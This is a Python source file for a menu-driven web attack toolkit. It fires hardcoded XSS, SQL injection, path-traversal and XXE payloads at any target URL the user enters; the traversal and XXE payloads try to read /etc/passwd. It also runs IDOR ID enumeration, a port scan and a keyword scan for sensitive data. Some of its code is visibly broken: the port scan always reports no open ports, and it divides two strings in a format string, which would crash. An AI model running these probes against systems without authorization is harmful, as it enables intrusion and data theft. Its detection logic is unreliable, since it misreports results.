#Coded And Made By no1se
import sys
import requests
import os
import re
import time
import platform
import socket
from tqdm import tqdm
from colorama import init, Fore, Style



init(autoreset=True)

#detecting clear
if platform.system() == 'Windows':
    clear_command = 'cls'
else:
    clear_command = 'clear'
#detecting clear

def idorvuln(url, vuln_parm, id_range):
    
    response = requests.get(url)
    org_response = response.content

    for id_value in range(id_range[0], id_range[1]+1):
        payload = { vuln_parm: id_value }
        response = requests.get(url, params=payload)

        #check
        if response.content != org_response:
            os.system(clear_command)
            print(f"{Fore.GREEN}Found IDOR vulnerability with value {id_value}{Style.RESET_ALL}")
            time.sleep(10)
            return
    print(f"{Fore.RED}No IDOR vulnerability found{Style.RESET_ALL}")
    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")
    time.sleep(10)
def xss():
    print(Fore.RED+"e.g. (http/s://example.com/lab1.php?) e.g. parameter name (file)")
    url = input(Fore.LIGHTMAGENTA_EX+"Enter the target URL: " + Fore.WHITE)
    param = input(Fore.LIGHTMAGENTA_EX+"Enter the input parameter name: " + Fore.WHITE)
    payloads = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS');>",
    "<svg onload=alert('XSS');>",
    "<iframe src=\"javascript:alert('XSS');\"></iframe>",
    "\"><script>alert('XSS');</script>",
    "\"><img src=x onerror=alert('XSS');>",
    "\"><svg onload=alert('XSS');>",
    "\"><iframe src=\"javascript:alert('XSS');\"></iframe>"
]
    for payload in payloads:
        params = {param: payload}
        r = requests.get(url, params=params)
        if payload in r.text:
            print(f"{Fore.GREEN}XSS payload found: {payload}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}XSS Not found!{Style.RESET_ALL}")
    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")        
    time.sleep(10)
def sql():
    url = input(Fore.LIGHTMAGENTA_EX+"Enter the target URL: " + Fore.WHITE)
    sqli_payloads = [
    "'",
    "\"",
    "--",
    ";",
    "/*",
    "*/",
    "' or 1=1 --",
    "\" or 1=1 --",
    "' union select 1,2,3 --",
    "\" union select 1,2,3 --",
    "' and 1=0 union select 1,2,3 --",
    "\" and 1=0 union select 1,2,3 --",
]
    for payload in sqli_payloads:
        sqli_url = url + payload
        response = requests.get(sqli_url)

        if "sql syntax" in response.text.lower() or "mysql_fetch" in response.text.lower() or "mysql_num_rows" in response.text.lower():
            print(f"{Fore.GREEN}Possible SQL injection vulnerability found at: {sqli_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}I did not find any sql injection vulnerability{Style.RESET_ALL}")
    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")
    time.sleep(10)

def portscan():
    os.system(clear_command)
    url = input(f"{Fore.LIGHTMAGENTA_EX}Enter the target URL {Fore.RED}(Without https:// or http://) : "+Fore.WHITE)
    ipadd = socket.gethostbyname(url)
    print(f"{Fore.GREEN}Scanning ports on {ipadd}/{url}...")
    for port in tqdm(range(1, 1000)):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ipadd, port))
        if result == 0:
            print(f"{Fore.GREEN} Port {port}: Open")
        sock.close()
    else:
        print(f"{Fore.RED}No open ports found on {Fore.GREEN}{ipadd/url}")

    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")   
    time.sleep(10)

def fileinc():
    os.system(clear_command)
    print(Fore.RED+"e.g. (http://example.com/lab1.php?file=) or (https://example.com/lab1.php?file=)")
    url = input(f"{Fore.LIGHTMAGENTA_EX}Enter the target URL: "+Fore.WHITE)
    payload = "../../../../../../../../etc/passwd"
    response = requests.get(url + payload)

    if "root:x" in response.text:
        print(f"{Fore.GREEN}[+] File inclusion vulnerability found: " + Fore.LIGHTYELLOW_EX+url)
    else:
        print(f"{Fore.RED}[-] No file inclusion vulnerability found: " + Fore.LIGHTYELLOW_EX+url)
    
    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")   
    time.sleep(10)

def exposure():
    os.system(clear_command)
    url = input(f"{Fore.LIGHTMAGENTA_EX}Enter the target URL: "+Fore.WHITE)
    response = requests.get(url)
    if response.status_code == 200:
        keywords = ["password", "credit card", "social security", "ssn", "bank account", "login", "account number", "routing number", "passport", "driver's license", "mother's maiden name", "dob", "date of birth", "email", "email address", "phone number", "address", "personal identification number", "pin", "tax file number", "tfn", "national insurance number", "nin", "health insurance number", "hin", "medical record number", "mrn", "patient identifier", "pi", "employee id", "employee number", "sscc", "batch number", "lot number", "serial number", "imei", "ip address", "mac address", "username", "userid", "user id", "user name", "authentication code", "security question", "mother's name", "father's name", "spouse's name", "maiden name", "previous name", "occupation", "income", "credit score", "credit report", "bank statement", "pay stub", "tax return", "w2 form", "1099 form", "social media", "facebook", "twitter", "instagram", "linkedin", "youtube", "google", "search history", "browser history", "cookies", "gps data", "location data", "geolocation", "smartphone data", "personal photos", "nude photos", "private photos", "confidential documents", "trade secrets", "intellectual property", "patent", "copyright"]
        for keyword in keywords:
            if keyword in response.text.lower():
                print(Fore.GREEN+"Sensitive data exposure detected for keyword: " + Fore.LIGHTYELLOW_EX+keyword)
    else:
        print(Fore.RED+"could not find sensitive data exposure on the website.")
    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")   
    time.sleep(10)

def XXE():
    os.system(clear_command)
    url = input(f"{Fore.LIGHTMAGENTA_EX}Enter the target URL: "+Fore.WHITE)
    xml_payload= '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>'
    response = requests.post(url, data=xml_payload)
    if 'root:' in response.text:
        print(f"{Fore.GREEN}XXE vulnerability found.")
    else:
        print(f"{Fore.RED}No XXE vulnerability found.")

    print(Fore.WHITE+"Returning Back to main menu In 10 seconds")   
    time.sleep(10)

def main_menu():
    os.system(clear_command)
    #Squidward
    print("        .--'''''''''--.")
    print("     .'      .---.      '.")
    print("    /    .-----------.    \'")
    print("   /        .-----.        \'")
    print("   |       .-.   .-.       |")
    print("   |      /   \ /   \      |")
    print("    \    | .-. | .-. |    /")
    print("     '-._| | | | | | |_.-'")
    print("         | '-' | '-' |")
    print("          \___/ \___/")
    print("       _.-'  /   \  `-._")
    print("     .' _.--|     |--._ '.")
    print("     ' _...-|     |-..._ '")
    print("            |     |")
    print("            '.___.'")
#Squidward
    print(Fore.RED+"Welcome to nvuln/WebSec Toolkit")
    print(Fore.LIGHTYELLOW_EX+"Please select an option:")
    print(f"{Fore.WHITE}1. Check for IDOR vulnerability{Style.RESET_ALL}")
    print(f"{Fore.WHITE}2. Check for XSS vulnerabilities{Style.RESET_ALL}")
    print(f"{Fore.WHITE}3. Check for SQL injection vulnerabilities{Style.RESET_ALL}")
    print(f"{Fore.WHITE}4. Check for open ports on a website{Style.RESET_ALL}")
    print(f"{Fore.WHITE}5. Check for file inclusion vulnerabilities{Style.RESET_ALL}")
    print(f"{Fore.WHITE}6. Check for sensitive data exposure")
    print(f"{Fore.WHITE}7. Check for XXE vulnerabilities")
    print(f"{Fore.LIGHTYELLOW_EX}8. Exit{Style.RESET_ALL}")
    selection = input(Fore.RED+"Select an option: "+Fore.WHITE)
    return selection


while True:
    selection = main_menu()
    if selection == "1":
        #IDOR
        url = input(Fore.LIGHTBLUE_EX+"Enter the URL to check: "+Fore.WHITE)
        vuln_parm = input(Fore.LIGHTBLUE_EX+"Enter the name of the vulnerable parameter: "+Fore.WHITE)
        id_range_start = int(input(Fore.LIGHTBLUE_EX+"Enter the starting ID value: "+Fore.WHITE))
        id_range_end = int(input(Fore.LIGHTBLUE_EX+"Enter the ending ID value: "+Fore.WHITE))
        id_range = [id_range_start, id_range_end]
        os.system(clear_command)
        idorvuln(url, vuln_parm, id_range)
        #IDOR ENDING
    elif selection == "2":
        #XSS
        os.system(clear_command)
        xss()
        #XSS ENDING
    elif selection == "3":
        #SQL
        os.system(clear_command)
        sql()
        #SQL ENDING
    elif selection == "4":
        #nmap
        portscan()
        #nmap ENDING
    elif selection == "5":
    #fileinc
        fileinc()
    #fileinc ENDING
    elif selection == "6":
    #sensitive
        exposure()
    #sensitive ENDING 
    elif selection == "7":
    #XXE
        XXE()
    #XXE ENDING 
    elif selection == "8":
        print(Fore.BLACK+"Exiting...")
        sys.exit(0)
    else:
        print(Fore.RED + "Invalid option. Please try again.")
        time.sleep(3)


        #Coded And Made By no1se
